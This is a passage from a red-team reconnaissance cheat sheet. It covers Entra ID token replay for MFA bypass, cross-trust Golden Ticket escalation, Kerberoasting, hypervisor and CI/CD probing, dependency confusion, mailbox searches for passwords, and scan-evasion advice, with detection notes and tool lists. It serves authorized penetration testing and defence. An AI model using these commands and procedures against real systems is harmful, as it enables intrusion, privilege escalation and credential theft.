# AADInternals: New-AADIntUserPRTToken            # Export PRT as browser-injectable cookie
# PRT cookie replayed in browser = full SSO access to all Entra ID-integrated apps without MFA
#
# Conditional Access Policy enumeration (critical for planning MFA bypass):
# GraphRunner: Invoke-GraphRunner -Tokens $tokens -All
# Dumps: Conditional Access policies, Named Locations, Authentication Methods
# Reveals: which apps require MFA, which IP ranges are trusted, device compliance requirements
#
# DETECTION: Entra ID Sign-in logs, Azure AD audit logs
# OPSEC: PRT abuse appears as legitimate SSO — very hard to distinguish from normal user activity

# ═══════════════════════════════════════════════════════════
# MULTI-IDP DISCOVERY
# ═══════════════════════════════════════════════════════════
# Identify which IdPs are in use:
# Check DNS for: adfs.target.com, sso.target.com, login.target.com, idp.target.com
# Check HTTP redirects: curl -sIL https://target.com/sso → reveals IdP in redirect chain
# Check email headers for auth infrastructure (X-MS-Exchange-Organization-AuthAs, etc.)
# Look for Duo, PingFederate, ForgeRock, OneLogin in response headers and login pages
```

---

## 15 — AD TRUST ENUMERATION  v3 SECTION

```bash
# ═══════════════════════════════════════════════════════════
# WHY TRUST ENUMERATION IS DIFFERENT FROM AD ENUMERATION
# ═══════════════════════════════════════════════════════════
# Standard AD recon maps users/groups/GPOs within ONE domain.
# Trust enumeration maps attack paths BETWEEN security domains.
# Cross-trust attacks are the primary path from subsidiary compromise to enterprise access.

# ═══════════════════════════════════════════════════════════
# TRUST DISCOVERY & CLASSIFICATION
# ═══════════════════════════════════════════════════════════
# Enumerate all trusts:
nltest /domain_trusts /all_trusts               # All trusts visible from current domain
# BloodHound CE (June 2025+): now has SameForestTrust and CrossForestTrust edges
# (replaces the older generic TrustedBy edge — models cross-trust attack paths)
#
# Trust types and their attack implications:
# INTRA-FOREST (Parent/Child): SID filtering does NOT strip ExtraSids within same forest
#   → Golden Ticket with Enterprise Admins SID in child domain = compromise entire forest
# CROSS-FOREST (External/Forest): SID filtering active — blocks well-known SIDs
#   → Cross-forest Kerberoasting still viable with bidirectional trusts
#   → SID history injection possible if SID filtering misconfigured
# PAM TRUST (bastion forest): msDS-ShadowPrincipal objects map to production forest groups
#   → Compromising bastion forest = controlling all connected production forests

# ═══════════════════════════════════════════════════════════
# CROSS-FOREST KERBEROASTING
# ═══════════════════════════════════════════════════════════
# With bidirectional forest trust, enumerate SPNs in target domain:
# GetUserSPNs.py -target-domain partner.com -dc-ip <DC> target.local/user:pass
# Request crackable TGS tickets from the foreign domain
# This works because Kerberos TGS-REQ is valid across trust boundaries

# ═══════════════════════════════════════════════════════════
# SID HISTORY & GOLDEN TICKET ACROSS TRUSTS
# ═══════════════════════════════════════════════════════════
# Check for SID history on accounts (indicates prior migration or abuse):
# Get-ADUser -Filter * -Properties SIDHistory | Where-Object {$_.SIDHistory -ne $null}
#
# Intra-forest escalation (child → forest root):
# 1. Compromise krbtgt hash in child domain
# 2. Forge Golden Ticket with ExtraSids containing Enterprise Admins SID (S-1-5-21-<forest>-519)
# 3. SID filtering does NOT block this within the same forest
# 4. Access forest root DC with Enterprise Admin privileges
#
# DETECTION: Event ID 4769 (TGS requests to foreign domain), unusual SID history additions
# OPSEC: Cross-trust Kerberos traffic is normal in multi-domain environments — moderate risk
```

---

## 16 — VIRTUALIZATION INFRASTRUCTURE  v3 SECTION

```bash
# ═══════════════════════════════════════════════════════════
# WHY HYPERVISOR ACCESS CHANGES EVERYTHING
# ═══════════════════════════════════════════════════════════
# Hypervisor compromise provides capabilities no guest-level access can match:
# execute commands on ANY VM without authentication, intercept VM memory,
# bypass all guest-level security controls. Ransomware groups increasingly
# encrypt VMDKs directly from the hypervisor level.
# UNC3886 demonstrated sophisticated ESXi exploitation chains.

# ═══════════════════════════════════════════════════════════
# VMWARE VCENTER / ESXI ENUMERATION
# ═══════════════════════════════════════════════════════════
# vCenter discovery:
nmap -sT -p 443,5480,9443 <target>              # vSphere Web Client, VAMI, vSphere Client
# vCenter SOAP API:
curl -sk https://<vcenter>/sdk                   # vSphere API endpoint
# Managed Object Browser (often accessible):
curl -sk https://<vcenter>/mob                   # Browse vCenter object model
# vCenter SSO endpoint:
curl -sk https://<vcenter>/websso/SAML2/SSO      # SSO for authentication
#
# ESXi direct access:
nmap -sT -p 443,22,80,902,5989 <target>         # HTTPS, SSH, HTTP, VMware auth, CIM
# ESXi SOAP API: https://<esxi>/sdk
#
# Post-compromise: extract vpxuser cleartext passwords from vCenter's vPostgreSQL database
# vpxuser credentials provide root-equivalent access to ALL connected ESXi hosts
# VMCI sockets allow lateral movement from hypervisor to guests — bypasses network segmentation

# ═══════════════════════════════════════════════════════════
# OTHER VIRTUALIZATION PLATFORMS
# ═══════════════════════════════════════════════════════════
# Hyper-V:
# Get-VM | Select Name,State,Path                # Enumerate VMs (requires Hyper-V admin)
# PowerShell remoting to Hyper-V host → full VM lifecycle control
#
# Proxmox VE:
nmap -sT -p 8006 <target>                       # Proxmox web interface
# Default credentials: root / (set during install, often weak)
# API: https://<proxmox>:8006/api2/json
#
# Docker Swarm:
nmap -sT -p 2376,2377 <target>                  # Docker TLS, Swarm manager
# curl http://<target>:2376/info                 # Docker info (if TLS not enforced)
#
# HashiCorp Nomad:
nmap -sT -p 4646,4647,4648 <target>             # HTTP API, RPC, Serf
# curl http://<target>:4646/v1/agent/self        # Often unauthenticated by default
# curl http://<target>:4646/v1/jobs              # List all jobs
#
# DETECTION: vCenter logs to syslog, ESXi logs in /var/log/
# OPSEC: Hypervisor compromise is extremely high-value but generates ESXi/vCenter audit logs
```

---

## 17 — SUPPLY CHAIN & CI/CD RECONNAISSANCE  v3 SECTION

```bash
# ═══════════════════════════════════════════════════════════
# WHY CI/CD IS A PRIMARY TARGET
# ═══════════════════════════════════════════════════════════
# CI/CD pipelines hold production deployment credentials and represent
# single points of compromise for entire software supply chains.
# The March 2025 tj-actions/reviewdog compromise affected thousands of GitHub repos.
# Dependency confusion attacks achieved code execution at 35+ orgs (Apple, Microsoft, etc.)

# ═══════════════════════════════════════════════════════════
# CI/CD SYSTEM DISCOVERY
# ═══════════════════════════════════════════════════════════
# Jenkins:
nmap -sT -p 8080,8443,50000 <target>            # Web UI, HTTPS, agent port
# curl -s http://<target>:8080/                  # Check for auth-free dashboard
# curl -s http://<target>:8080/script            # Groovy Script Console (RCE if accessible)
# /asynchPeople/ endpoint often accessible without auth — reveals all users
#
# GitLab:
nmap -sT -p 80,443,22 <target>                  # Web, HTTPS, Git SSH
# /api/v4/projects?visibility=public             # Public projects (if API accessible)
# /users/sign_in                                 # Confirm GitLab instance
#
# GitHub Enterprise:
nmap -sT -p 443,8443,122,9418 <target>          # HTTPS, Management, SSH, Git
#
# Artifactory / Nexus (artifact repositories):
nmap -sT -p 8081,8082 <target>                  # Artifactory, Nexus
# curl -s http://<target>:8081/artifactory/api/system/ping  # Artifactory health check
# Anonymous access to artifact repos = internal package names + potentially credentials

# ═══════════════════════════════════════════════════════════
# DEPENDENCY CONFUSION RECONNAISSANCE
# ═══════════════════════════════════════════════════════════
# Discover internal package names (recon for dependency confusion attacks):
#   - Public GitHub repos: search package.json, requirements.txt, go.mod for private registries
#   - JavaScript source maps: often expose internal module names
#   - Error messages in production: may leak internal package names
#   - Internal Artifactory/Nexus: browse repository listings if anonymous access enabled
# Register internal package name on public registry with higher version number
#   → build system installs public (malicious) version instead of internal one

# ═══════════════════════════════════════════════════════════
# SECRET SCANNING IN BUILD SYSTEMS
# ═══════════════════════════════════════════════════════════
# TruffleHog v3 (800+ credential detectors, active verification):
# trufflehog git https://github.com/target-org/repo.git
# trufflehog github --org target-org              # Scan entire GitHub org
# Scans: git history, Jenkins build logs, CI config files, environment variables
#
# Gitleaks:
# gitleaks detect --source /path/to/repo
#
# Common secrets in CI/CD:
#   - .env files committed to repos
#   - GitHub Actions workflow secrets (visible in workflow logs if echo'd)
#   - Jenkins credentials.xml (encrypted but crackable with master.key)
#   - GitLab CI/CD variables (accessible via API with maintainer token)
#   - Docker images with embedded secrets (inspect with dive or docker history)
#
# DETECTION: GitHub audit log, Jenkins build logs, GitLab audit events
# OPSEC: Source code access blends with developer activity — moderate risk
```

---

## 18 — SEGMENTATION DISCOVERY & EMAIL/MESSAGING  v3 SECTION

```bash
# ═══════════════════════════════════════════════════════════
# INTERNAL SEGMENTATION MAPPING (different from scanning)
# ═══════════════════════════════════════════════════════════
# Most red team guides document pivot tools but not systematic topology discovery.
# The gap between PERCEIVED and ACTUAL segmentation is a primary finding.
#
# Technique: compare port scan results from different pivot points
# If Host A can reach 10.0.1.0/24 but Host B cannot → firewall between them
# Traceroute variations expose intermediate filtering:
traceroute -T -p 445 <target>                    # TCP traceroute to specific port
traceroute -T -p 22 <target>                     # Compare paths for different services
# Different paths = different firewall rules = segmentation map
#
# ARP tables from compromised hosts reveal local segment:
arp -a                                           # Windows/Linux
cat /proc/net/arp                                # Linux (no process creation)
# Routing tables reveal gateway and connected subnets:
ip route                                         # Linux
route print                                      # Windows
# CDP/LLDP from compromised hosts (if network devices advertise):
# tcpdump -i eth0 -nn -v 'ether[12:2] = 0x88cc' # Capture LLDP frames
# tcpdump -i eth0 -nn -v 'ether[20:2] = 0x2000' # Capture CDP frames
#
# Systematically map: what can each compromised host reach that others cannot?
# This reveals actual firewall rules without ever touching the firewall.

# ═══════════════════════════════════════════════════════════
# EMAIL / MESSAGING INFRASTRUCTURE
# ═══════════════════════════════════════════════════════════
# Exchange Autodiscover (leaks internal hostnames and domain info):
curl -s https://autodiscover.target.com/autodiscover/autodiscover.xml
# Offline Address Book (complete organizational directory):
# Access via OWA/EWS: /oab/ endpoint
# MailSniper (global mailbox search — post-compromise):
# Invoke-SelfSearch -Mailbox user@target.com -Terms "password","credentials","vpn"
# Invoke-GlobalMailSearch -ImpersonationAccount admin@target.com -Terms "password"
#
# Microsoft Teams / Slack:
# TeamFiltration: user validation, message exfiltration via Teams
# Slack workspace discovery: try target-name.slack.com
# Slack API token in source code → full workspace access
#
# IMPORTANT: NTLM relay via Exchange has been significantly hardened:
# Exchange 2019 CU14+ (Feb 2024) enables Extended Protection by default
# Windows Server 2025 removes NTLMv1 entirely
# Test relay viability BEFORE assuming it works

# ═══════════════════════════════════════════════════════════
# PHYSICAL SECURITY SYSTEMS ON THE NETWORK
# ═══════════════════════════════════════════════════════════
# IP cameras / DVR / NVR:
nmap -sT -p 554,8000,8080,37777 <target>        # RTSP, Hikvision, HTTP, Dahua
# ONVIF protocol discovery:
nmap --script broadcast-wsdd-discover            # Web Services Discovery (finds ONVIF cameras)
# Default credentials are epidemic: admin/admin, admin/12345, admin/blank
#
# Access control panels:
# HID Mercury: CVE-2022-31481 (CVSS 10.0) — unauth RCE → physical door unlock + alarm bypass
# LenelS2 NetBox: CVE-2024-2420 (CVSS 9.8) — hard-coded credentials
# Tridium Niagara Framework: 13 vulns disclosed 2025, over 1 million installations
nmap -sT -p 1911,4911 <target>                  # Niagara Fox protocol, Niagara HTTPS
#
# Building Management Systems (beyond BACnet — see Section 7):
nmap -sT -p 1911,4911,502,47808 <target>        # Niagara, Modbus, BACnet
#
# INTELLIGENCE VALUE: Physical access = bypass all digital security
# OPSEC: Physical security systems rarely have logging that feeds into SIEM
```

---

## 19 — OUTDATED MYTHS & REALITY CHECK  v3 SECTION

```
COMMONLY REPEATED "FACTS" THAT NEED QUALIFICATION:
──────────────────────────────────────────────────────────────
MYTH                          │ REALITY (2026)
──────────────────────────────┼─────────────────────────────────────────────────
"SYN scan is stealthy"        │ Nmap itself warns against assuming SYN scan is
                              │ undetectable. All commercial IDS/IPS have default
                              │ signatures. SYN scan is the most EFFICIENT default
                              │ but NOT stealthy. Only idle scan (-sI) sends zero
                              │ packets from your IP. Call it "low-noise" not "stealth."
──────────────────────────────┼─────────────────────────────────────────────────
"Fragmentation bypasses IDS"  │ Modern IDS/IPS performs full fragment reassembly.
                              │ Fragmented traffic is itself ANOMALOUS in modern
                              │ networks and may trigger alerts precisely because
                              │ it's unusual. May work against legacy-only deployments.
──────────────────────────────┼─────────────────────────────────────────────────
"Slow scanning avoids         │ Defeats threshold-based IDS rules, but behavioral
 detection"                   │ analytics (UEBA — Exabeam, Splunk, Sentinel) build
                              │ baselines and flag ANY deviation, even 1 probe/minute
                              │ to unusual ports. Effective against immature SOCs only.
──────────────────────────────┼─────────────────────────────────────────────────
"MAC spoofing = anonymity"    │ Works against MAB (MAC Authentication Bypass) but
                              │ fails against 802.1X with MACsec. In practice MACsec
                              │ is rarely deployed, so transparent bridge attacks
                              │ remain viable — but don't assume it works everywhere.
──────────────────────────────┼─────────────────────────────────────────────────
"NTLM relay always works"     │ Exchange 2019 CU14+ (Feb 2024) enables Extended
                              │ Protection by default. Windows Server 2025 removes
                              │ NTLMv1. LDAP signing/channel binding increasingly
                              │ enforced. Always verify relay viability before assuming.
──────────────────────────────┼─────────────────────────────────────────────────
"Null sessions enumerate      │ Null sessions have been progressively restricted since
 everything"                  │ Windows Server 2012 R2. Many modern configs block them.
                              │ Guest sessions and low-priv authenticated enum are more
                              │ reliable. Always test null first, but have credentials ready.
──────────────────────────────┼─────────────────────────────────────────────────
"GRASSMARLIN for OT mapping"  │ Repository archived April 2023 — no longer maintained.
                              │ Still functional for PCAP analysis but won't get updates.
                              │ Consider Zeek + ICS analyzers or commercial alternatives.

BOTTOM LINE: An operator making tactical decisions based on 1990s assumptions
about SYN scan stealth or fragmentation evasion faces unnecessary detection risk.
Every technique's effectiveness depends on the TARGET'S specific defenses, not
on generalizations from outdated sources. Always validate assumptions.
```

---

## 20 — OPSEC & DETECTION REFERENCE

```
ACTIVE RECON DETECTION SIGNATURES:
──────────────────────────────────────────────────────────────
TECHNIQUE              │ NOISE LEVEL │ KEY DETECTIONS             │ TYPICAL RESPONSE
───────────────────────┼─────────────┼────────────────────────────┼──────────────────
DNS brute force        │ LOW-MED     │ High query volume          │ Rate limit, block
DNS over HTTPS recon   │ VERY LOW    │ Encrypted, blends w/ HTTPS │ Undetectable by DNS monitoring
DNS cache snooping     │ VERY LOW    │ Single UDP packet per check│ Rarely detected
ARP scan               │ VERY LOW    │ ARP flood (local only)     │ Rarely alerted (NAC may detect)
IPv6 multicast ping    │ VERY LOW    │ Normal NDP behavior        │ Almost never monitored
Ping sweep (ICMP)      │ MEDIUM      │ IDS "ICMP sweep" signature │ Log + alert
TCP SYN scan (slow)    │ LOW-MED     │ FW conn logs, IDS partial  │ May go unnoticed
TCP SYN scan (fast)    │ HIGH        │ IDS "port scan" signature  │ Block source IP
Full port scan         │ VERY HIGH   │ 65K SYN packets per host   │ Immediate block
Service version (-sV)  │ MEDIUM      │ Banner grab patterns       │ Log
  (default intensity 7)│             │ (more probes than expected)│
Nmap scripts (-sC)     │ MED-HIGH    │ NSE probe signatures       │ WAF/IDS alert
Nuclei scan            │ HIGH        │ Hundreds of HTTP probes    │ WAF block
  (default JA3=Go)     │             │ + TLS fingerprint mismatch │
Dir brute force        │ HIGH        │ 404 spike in access logs   │ WAF block/rate limit
Nessus/OpenVAS         │ VERY HIGH   │ Thousands of probes        │ Immediate detection
Masscan                │ EXTREME     │ SYN flood appearance       │ DDoS mitigation trigger
Responder passive (-A) │ NEAR-ZERO   │ None (only listens)        │ No known detection method
ICS Modbus read        │ LOW         │ ICS IDS (Claroty/Dragos)   │ Alert + investigation
ICS active scanning    │ DANGEROUS   │ ICS IDS + potential crash  │ Immediate response

NOTE: Noise levels and detection risk are OPERATOR ASSESSMENTS based on typical
enterprise monitoring. Actual detectability depends on target's specific IDS/IPS,
NAC, SIEM correlation, DNS analytics, endpoint telemetry, and TLS fingerprinting deployment.

NETWORK DETECTION SOURCES:
  IDS/IPS: Snort/Suricata rules for scan patterns
  Firewall: Connection logs, denied connections spike
  NetFlow: New flows to many ports from single source
  WAF: HTTP probe patterns, known scanner User-Agents, JA3/JA4 fingerprints    ← UPDATED
  DNS: Query volume anomaly, brute force pattern
  SIEM: Correlation of failed connections across multiple hosts/ports
  EDR: Process creation, network connection telemetry, behavioral analytics     
  TLS inspection: JA3/JA4+ fingerprint matching against known tool signatures  
  Deception: Canary tokens, honeypots, honeytoken AD accounts                  

SCAN OPSEC BEST PRACTICES:
  1. Passive first — exhaust Shodan, Censys, CT logs before sending a single packet
  2. Manage TLS fingerprints — match browser JA3/JA4 on ALL HTTPS interactions
  3. DNS queries blend well — use DoH for external, standard for internal
  4. Single HTTPS requests are nearly invisible (cert check, header grab)
  5. Targeted scans (specific ports on specific hosts) >> full range sweeps
  6. Set realistic User-Agent AND matching Accept/Accept-Language/Accept-Encoding headers
  7. Scan from infrastructure matching expected traffic sources
     (cloud VPS for external targets, domain-joined host for internal)
  8. Spread scans across time — avoid concentrated bursts
  9. Save scan results locally — never rescan what you've already mapped
  10. Operate during target's business hours and match timezone patterns           
  11. Infrastructure rotation: <72 hours per engagement IP                         
  12. Assume honeypots/canary tokens are deployed — verify before interacting      
  13. Know the target's EDR before running recon commands (see Section 9)           
  14. IPv6 lateral movement avoids most IPv4-focused monitoring                    
  15. Check for JA3/JA4-based WAF rules before web scanning (test with curl_cffi)  
```

---

## 21 — TOOL QUICK REFERENCE

```
HOST DISCOVERY:
  Nmap (-sn)                   Network host discovery (ICMP/TCP/ARP/UDP)
  Masscan                      Ultra-fast port/host discovery
  RustScan                     Fast port discovery → Nmap handoff
  Netdiscover                  ARP-based discovery (active + passive)
  fping                        Fast ICMP ping sweep
  arp-scan                     ARP-based local subnet scan
  Responder (-A)               Passive broadcast listener (zero noise)
  THC-IPv6 (alive6)            IPv6 host discovery on local segment               

PORT SCANNING:
  Nmap                         Industry standard — SYN/Connect/UDP/Idle scan
  Masscan                      Fastest port scanner (millions of packets/sec)
  RustScan                     Rust-based fast scanner with Nmap integration

SERVICE ENUMERATION:
  NetExec (nxc)                SMB/LDAP/WinRM/MSSQL/SSH enumeration (CME successor, now canonical)
  enum4linux-ng                SMB/RPC enumeration (modern rewrite)
  ldapsearch                   LDAP query tool
  kerbrute                     Kerberos user enumeration
  snmpwalk / onesixtyone       SNMP enumeration and community string brute
  ssh-audit                    SSH configuration audit
  smtp-user-enum               SMTP user enumeration (VRFY/RCPT)

ACTIVE DIRECTORY:
  BloodHound CE                AD attack path analysis (SpecterOps rewrite, ADCS support)  ← UPDATED
  Certipy                      AD Certificate Services enumeration (ESC1-ESC16)            
  Coercer                      Windows RPC auth coercion triggering (NOT exploit — coerces auth) 
  bloodhound-python            Python BloodHound collector (cross-platform)
  AADInternals                 Azure AD / Entra ID recon (unauthenticated capable)
  ROADtools                    Full Azure AD graph dump to SQLite                           
  GraphRunner                  Entra ID post-exploitation via Microsoft Graph               

WEB APPLICATION:
  Feroxbuster                  Fast recursive directory brute force (Rust)
  Gobuster                     Directory/DNS/VHost brute force (Go)
  ffuf                         Fast web fuzzer (Go)
  Dirsearch                    Directory brute force (Python)
  httpx                        HTTP probing, tech detect, status codes
  whatweb                      Technology fingerprinting
  dnsx                         Fast DNS resolution and brute force
  subfinder                    Passive subdomain enumeration

TLS FINGERPRINT EVASION:                                                           
  curl-impersonate / curl_cffi Python library for browser TLS impersonation
  utls (Go)                    Low-level TLS ClientHello control
  tls-client (Go)              High-level browser profile impersonation
  CycleTLS (Node.js)           Per-request fingerprint rotation

VULNERABILITY SCANNING:
  Nuclei                       Template-based vuln scanner (community templates)
  Nmap NSE                     Nmap scripting engine vulnerability checks
  Nessus                       Commercial comprehensive vulnerability scanner
  OpenVAS / Greenbone          Open-source vulnerability scanner
  searchsploit                 Local ExploitDB search
  testssl.sh                   TLS/SSL configuration audit
  sslscan                      SSL cipher and certificate analysis

CLOUD ENUMERATION:
  cloud_enum                   Multi-cloud asset enumeration
  S3Scanner                    AWS S3 bucket finder
  Pacu                         AWS exploitation framework (Rhino Security)                 
  CloudFox                     Cross-account AWS recon (Bishop Fox)                         
  MicroBurst                   Azure enumeration toolkit
  ScoutSuite                   Multi-cloud security audit
  Prowler                      Multi-cloud CIS benchmark auditing                          
  AADInternals                 Azure AD / Entra ID recon
  ROADtools                    Azure AD graph dump + GUI                                   

C2 FRAMEWORKS (for internal recon through implants):                               
  Cobalt Strike                Commercial, industry standard, BOF support
  Sliver (Bishop Fox)          Open-source, mTLS/WireGuard/HTTP(S)/DNS, per-binary crypto
  Havoc                        Qt GUI, Demon agent, BOF + reflective DLL, Graph API C2
  Mythic                       Modular, multi-agent, web GUI, community agents
  Brute Ratel (BRc4)           Commercial, designed for EDR evasion

TUNNELING & PIVOTING:                                                              
  Ligolo-ng                    TUN-interface tunnel — run Nmap/Impacket directly through
  chisel                       HTTP tunnel (Go)
  RedGuard                     C2 redirector and traffic filter

ICS / OT RECON:                                                                    
  GRASSMARLIN (NSA)            Passive OT topology from PCAPs (⚠️ ARCHIVED Apr 2023, still functional)
  Digital Bond Redpoint        ICS-specific Nmap NSE scripts (dnp3-info requires manual install)
  Nmap ICS scripts             modbus-discover, s7-info, enip-info, bacnet-info (official Nmap)

WIRELESS / RF:                                                                     
  Kismet                       Comprehensive wireless survey (WiFi, BT, more)
  Aircrack-ng                  WiFi monitoring, capture, cracking
  Bettercap                    WiFi/BLE/NDP attacks, multi-protocol
  Proxmark3                    RFID/NFC research and cloning
  HackRF One / RTL-SDR         Software-defined radio (spectrum analysis, signal capture)
  Flipper Zero                 Multi-tool (RFID, NFC, BLE, Sub-GHz, IR)

NETWORK DEVICE / INFRASTRUCTURE:                                                    v3
  RouterSploit                 Exploitation framework for embedded/network devices
  Yersinia                     Layer 2 attack framework (CDP, DTP, VTP, STP, DHCP)
  FRRouting                    Deploy rogue routers into OSPF/BGP domains
  VoIP Hopper                  Voice VLAN discovery via CDP/LLDP-MED

IDENTITY PROVIDER ENUMERATION:                                                      v3
  AADInternals                 Entra ID / Azure AD recon (unauthenticated capable)
  ROADtools                    Azure AD graph dump + GUI
  GraphRunner                  Entra ID post-exploitation via Microsoft Graph
  ADFSDump / ADFSpoof          ADFS token signing cert extraction + forging
  OktaPostExToolkit            Okta skeleton key + agent emulation

BACKUP / VIRTUALIZATION:                                                            v3
  (Nmap/nxc for port discovery) Veeam 9392, Commvault 8400-8403, Veritas 13724
  vSphere CLI / PowerCLI       VMware vCenter/ESXi enumeration
  pyvmomi                      Python VMware API library for VM enumeration

SUPPLY CHAIN / CI-CD:                                                               v3
  TruffleHog v3                Secret scanning (800+ credential detectors, active verification)
  Gitleaks                     Git repo secret scanning
  Jenkins Script Console       /script endpoint — Groovy RCE if accessible

METHODOLOGY REFERENCES:
  MITRE ATT&CK TA0043          https://attack.mitre.org/tactics/TA0043/
  MITRE ATT&CK TA0007          https://attack.mitre.org/tactics/TA0007/
  CISA KEV Catalog              https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  LOLBAS Project                https://lolbas-project.github.io/                          
  GTFOBins                      https://gtfobins.github.io/                                
  PTES (Penetration Testing Execution Standard)
  OSSTMM (Open Source Security Testing Methodology Manual)
  NIST SP 800-115              Technical Guide to Information Security Testing
  NIST SP 800-82               Guide to ICS Security                                       
  RFC 7707                     Network Reconnaissance in IPv6 Networks                     
```

---

*Mapped to: MITRE ATT&CK TA0043 (Reconnaissance — pre-access): T1595.001 (Active Scanning: IP Blocks) · T1595.002 (Active Scanning: Vulnerability Scanning) · T1595.003 (Active Scanning: Wordlist Scanning) · Also covers TA0007 (Discovery — post-access): T1046 (Network Service Discovery) · T1018 (Remote System Discovery) · T1016 (System Network Configuration Discovery) · T1016.001 (Internet Connection Discovery) · T1016.002 (Wi-Fi Discovery) · T1049 (System Network Connections Discovery) · T1069 (Permission Groups Discovery) · T1069.001/.002/.003 (Local/Domain/Cloud Groups) · T1087 (Account Discovery) · T1087.001/.002/.003/.004 (Local/Domain/Email/Cloud Account) · T1135 (Network Share Discovery) · T1082 (System Information Discovery) · T1526 (Cloud Service Discovery) · T1482 (Domain Trust Discovery) · Also: T1090.004 (Domain Fronting) · T1557 (Adversary-in-the-Middle — NDP/ARP spoofing for recon) · T1199 (Trusted Relationship — cross-trust abuse) · T1195.001/.002 (Supply Chain Compromise — build/software) · T1552.004 (Unsecured Credentials: Private Keys — ADFS token signing) · T1606.002 (Forge Web Credentials: SAML Tokens — Golden SAML)*

*v3 additions: T1482 (Domain Trust Discovery), T1199 (Trusted Relationship), T1195 (Supply Chain), T1552.004 (Private Keys), T1606.002 (SAML Tokens). Sub-technique mappings per MITRE ATT&CK v18.*
  
  
***Current as of 24 March 2026*** NoVanity